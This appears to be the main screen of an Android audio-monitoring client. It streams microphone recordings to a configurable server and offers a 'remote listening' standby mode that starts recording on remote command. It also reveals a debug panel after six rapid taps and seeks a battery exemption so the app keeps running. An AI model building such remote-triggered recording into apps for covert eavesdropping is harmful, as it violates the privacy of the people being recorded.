package com.audiostream.client

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.text.SimpleDateFormat
import java.util.*

/**
 * MainActivity.kt — Main UI for the Audio Monitor client.
 *
 * Displays:
 *   - Server URL input
 *   - Start/Stop controls
 *   - Live status: connection, recording, pending uploads, retries
 *   - Storage info
 *   - Scrolling activity log
 *
 * Receives broadcast updates from AudioRecordService to keep
 * the UI synchronized with the background service state.
 */

class MainActivity : AppCompatActivity() {

    // UI Elements
    private lateinit var etServerUrl: EditText
    private lateinit var btnStart: Button
    private lateinit var btnStop: Button
    private lateinit var btnStandby: Button
    private lateinit var tvStatus: TextView
    private lateinit var vStatusDot: View
    private lateinit var tvConnection: TextView
    private lateinit var tvPending: TextView
    private lateinit var tvRetries: TextView
    private lateinit var tvDuration: TextView
    private lateinit var tvStorage: TextView
    private lateinit var tvClientName: TextView
    private lateinit var tvLog: TextView
    private lateinit var scrollLog: ScrollView

    private lateinit var tvHeader: TextView
    private lateinit var tvPublicPackets: TextView
    private lateinit var debugPanel: View
    private var secretTapCount = 0
    private var lastSecretTapTime = 0L

    private lateinit var prefs: SharedPreferences

    // ── Broadcast Receiver ──
    private val serviceReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                AudioRecordService.ACTION_STATE_UPDATE -> {
                    val pending = intent.getIntExtra(AudioRecordService.EXTRA_PENDING, 0)
                    val retries = intent.getIntExtra(AudioRecordService.EXTRA_RETRIES, 0)
                    val duration = intent.getLongExtra(AudioRecordService.EXTRA_DURATION, 0)
                    val connection = intent.getStringExtra(AudioRecordService.EXTRA_CONNECTION) ?: "—"
                    val storage = intent.getStringExtra(AudioRecordService.EXTRA_STORAGE) ?: ""

                    updateStats(pending, retries, duration, connection, storage)
                }
                AudioRecordService.ACTION_LOG -> {
                    val message = intent.getStringExtra(AudioRecordService.EXTRA_MESSAGE)
                    if (message != null) appendLog(message)
                }
            }
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // LIFECYCLE
    // ══════════════════════════════════════════════════════════════════════

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize UI references
        etServerUrl = findViewById(R.id.etServerUrl)
        btnStart = findViewById(R.id.btnStart)
        btnStop = findViewById(R.id.btnStop)
        btnStandby = findViewById(R.id.btnStandby)
        tvStatus = findViewById(R.id.tvStatus)
        vStatusDot = findViewById(R.id.vStatusDot)
        tvConnection = findViewById(R.id.tvConnection)
        tvPending = findViewById(R.id.tvPending)
        tvRetries = findViewById(R.id.tvRetries)
        tvDuration = findViewById(R.id.tvDuration)
        tvStorage = findViewById(R.id.tvStorage)
        tvClientName = findViewById(R.id.tvClientName)
        tvLog = findViewById(R.id.tvLog)
        scrollLog = findViewById(R.id.scrollLog)
        
        tvHeader = findViewById(R.id.tvHeader)
        tvPublicPackets = findViewById(R.id.tvPublicPackets)
        debugPanel = findViewById(R.id.debugPanel)

        prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)

        // Setup Secret Trigger
        tvHeader.setOnClickListener {
            val now = System.currentTimeMillis()
            if (now - lastSecretTapTime < 500) {
                secretTapCount++
            } else {
                secretTapCount = 1
            }
            lastSecretTapTime = now

            if (secretTapCount >= 6) {
                secretTapCount = 0
                val isHidden = debugPanel.visibility == View.GONE
                debugPanel.visibility = if (isHidden) View.VISIBLE else View.GONE
                if (isHidden) {
                    Toast.makeText(this, "Debug Panel Revealed", Toast.LENGTH_SHORT).show()
                }
            }
        }

        // Restore saved URL
        val savedUrl = prefs.getString("server_url", "https://audio-steam-server.onrender.com")
        etServerUrl.setText(savedUrl)

        // Show client name
        val clientName = prefs.getString("client_name", null)
            ?: "${Build.MANUFACTURER.replaceFirstChar { it.uppercase() }}-${Build.MODEL.replace(" ", "-")}"
        tvClientName.text = "Client: $clientName"

        // Button handlers
        btnStart.setOnClickListener { startService() }
        btnStop.setOnClickListener { stopService() }
        btnStandby.setOnClickListener { toggleStandby() }

        // Register broadcast receiver
        val filter = IntentFilter().apply {
            addAction(AudioRecordService.ACTION_STATE_UPDATE)
            addAction(AudioRecordService.ACTION_LOG)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(serviceReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(serviceReceiver, filter)
        }

        // Sync UI with service state
        updateUIForServiceState(AudioRecordService.isRunning)
    }

    override fun onResume() {
        super.onResume()
        updateUIForServiceState(AudioRecordService.isRunning)
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(serviceReceiver)
        } catch (e: Exception) { /* already unregistered */ }
    }

    // ══════════════════════════════════════════════════════════════════════
    // SERVICE CONTROL
    // ══════════════════════════════════════════════════════════════════════

    private fun startService() {
        val url = etServerUrl.text.toString().trim()
        if (url.isEmpty()) {
            Toast.makeText(this, "Please enter a server URL", Toast.LENGTH_SHORT).show()
            return
        }

        // Save URL
        prefs.edit()
            .putString("server_url", url)
            .putBoolean("was_running", true)
            .apply()

        // Check permissions
        val required = mutableListOf(Manifest.permission.RECORD_AUDIO)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            required.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missing = required.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
            return
        }

        // Request battery optimization exemption so Android OS never kills the app after 10-12 minutes
        checkBatteryOptimization()

        // Start the service
        val intent = Intent(this, AudioRecordService::class.java).apply {
            action = AudioRecordService.ACTION_START
            putExtra(AudioRecordService.EXTRA_SERVER_URL, url)
        }
        ContextCompat.startForegroundService(this, intent)
        updateUIForServiceState(true)
        appendLog("Starting service...")
    }

    private fun checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = android.net.Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    // Fallback ignored
                }
            }
        }
    }

    private fun stopService() {
        prefs.edit().putBoolean("was_running", false).apply()

        val intent = Intent(this, AudioRecordService::class.java).apply {
            action = AudioRecordService.ACTION_STOP
        }
        startService(intent)
        updateUIForServiceState(false)
        appendLog("Stopping service...")
    }

    // ══════════════════════════════════════════════════════════════════════
    // UI UPDATES
    // ══════════════════════════════════════════════════════════════════════

    private fun updateUIForServiceState(running: Boolean) {
        if (running) {
            btnStart.visibility = View.GONE
            btnStandby.visibility = View.GONE
            btnStop.visibility = View.VISIBLE
            tvStatus.text = "● Recording"
            tvStatus.setTextColor(Color.parseColor("#10b981"))
            vStatusDot.setBackgroundColor(Color.parseColor("#10b981"))
            etServerUrl.isEnabled = false
        } else if (AudioRecordService.isStandbyMode) {
            btnStart.visibility = View.VISIBLE
            btnStandby.text = "⏹ STOP LISTENING"
            btnStandby.visibility = View.VISIBLE
            btnStop.visibility = View.GONE
            tvStatus.text = "📡 Standby Mode"
            tvStatus.setTextColor(Color.parseColor("#a78bfa"))
            vStatusDot.setBackgroundColor(Color.parseColor("#a78bfa"))
            etServerUrl.isEnabled = false
        } else {
            btnStart.visibility = View.VISIBLE
            btnStandby.text = "📡 ENABLE REMOTE LISTENING"
            btnStandby.visibility = View.VISIBLE
            btnStop.visibility = View.GONE
            tvStatus.text = "○ Stopped"
            tvStatus.setTextColor(Color.parseColor("#f87171"))
            vStatusDot.setBackgroundColor(Color.parseColor("#f87171"))
            etServerUrl.isEnabled = true
            tvDuration.text = "00:00"
            tvStorage.text = "—"
        }
    }

    private fun toggleStandby() {
        if (AudioRecordService.isStandbyMode) {
            val intent = Intent(this, AudioRecordService::class.java).apply {
                action = AudioRecordService.ACTION_STOP
            }
            startService(intent)
            appendLog("Standby mode disabled.")
        } else {
            val url = etServerUrl.text.toString().trim()
            if (url.isEmpty()) {
                Toast.makeText(this, "Please enter a server URL", Toast.LENGTH_SHORT).show()
                return
            }

            prefs.edit().putString("server_url", url).apply()
            checkBatteryOptimization()

            val intent = Intent(this, AudioRecordService::class.java).apply {
                action = AudioRecordService.ACTION_STANDBY
                putExtra(AudioRecordService.EXTRA_SERVER_URL, url)
            }
            ContextCompat.startForegroundService(this, intent)
            appendLog("Standby mode enabled. Listening for remote commands...")
        }
        
        btnStandby.postDelayed({ updateUIForServiceState(AudioRecordService.isRunning) }, 300)
    }

    private fun updateStats(pending: Int, retries: Int, duration: Long,
                            connection: String, storage: String) {
        tvConnection.text = connection
        tvPending.text = pending.toString()
        tvRetries.text = retries.toString()
        tvDuration.text = formatDuration(duration)
        tvStorage.text = storage
        
        val packetsSent = Math.max(0, (duration / 10000).toInt() - pending)
        tvPublicPackets.text = packetsSent.toString()

        // Color connection status
        tvConnection.setTextColor(when (connection) {
            "Connected" -> Color.parseColor("#34d399")
            "Disconnected" -> Color.parseColor("#f87171")
            "Reconnecting", "Waiting" -> Color.parseColor("#fbbf24")
            else -> Color.parseColor("#8888a0")
        })
    }

    private val logBuffer = ArrayDeque<String>()

    private fun appendLog(message: String) {
        val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        logBuffer.addFirst("[$time] $message")
        while (logBuffer.size > 100) {
            logBuffer.removeLast()
        }
        tvLog.text = logBuffer.joinToString("\n")
    }

    private fun formatDuration(seconds: Long): String {
        val h = seconds / 3600
        val m = (seconds % 3600) / 60
        val s = seconds % 60
        return if (h > 0) String.format("%02d:%02d:%02d", h, m, s)
        else String.format("%02d:%02d", m, s)
    }

    // ══════════════════════════════════════════════════════════════════════
    // PERMISSIONS
    // ══════════════════════════════════════════════════════════════════════

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                startService()
            } else {
                Toast.makeText(this, "Permissions are required for recording", Toast.LENGTH_LONG).show()
                appendLog("ERROR: Permissions denied")
            }
        }
    }
}
